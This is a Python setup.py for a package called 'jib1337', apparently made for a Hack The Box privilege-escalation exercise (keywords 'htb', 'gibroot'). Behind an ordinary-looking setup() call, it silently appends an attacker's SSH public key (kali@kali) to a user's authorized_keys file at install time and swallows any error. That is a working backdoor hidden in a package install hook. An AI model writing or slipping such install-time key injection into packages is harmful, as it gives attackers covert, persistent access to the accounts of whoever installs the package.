from setuptools import setup
import socket,subprocess,os

try:
    with open('/home/low/.ssh/authorized_keys', 'a') as keyFile:
        keyFile.write('\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpqZqBVtwhsgulw9N3Elx4o74rOlN+4rRiN1VgMWPf2VmT7xJW/WHtyRpaXWTjLVNQBY8blHz5MvfzH5sZu5FfgDFIPq4RPyELNI5w2Wk1BQQSivTx/HXcB3FKv2RIHPGlUmhsQJH4xOoQBIhNtkuKPc9E3EwINQ4cSNfZc88yUl2JVYLrISBQxR8g4l3A/8pbqYmh8oZYJRaiUis0Ct66QhnGgBlgBz0+Zjz68+hQjA3R6iC5830DLiplm7vs5qs59a7ZswZUdxA6KjWKPa+K/wkqcMTpqTU6+BI2E3aI7VdaD7x83HPKNcZOzu3+KQtgZ3jujhgRM8ln8VNBuTPbTtq28NuWT2sT5NsQRhHp+aiKzJY6GhbJ1c3DTCdjivojvrjQRlCgaqQFE12kZRvjmoN5H4wpA6cbyNHr2DgedFDHxisF0HYxawtUvBu41pLtJ/z46nG9Pgz/BpswALFdSIcL1x0w2IAjEbn+CvB+XzNnWgpgtUdW3Thi7NvB9xU= kali@kali')
except:
    pass

setup(
    name='jib1337',
    packages=['jib1337'],
    description='Bebbys first pypi package',
    version='1.337',
    url='https://www.jacknelson.com.au',
    author='jib1337',
    author_email='lol@lol.com',
    keywords=['fake','htb','gibroot']
    )
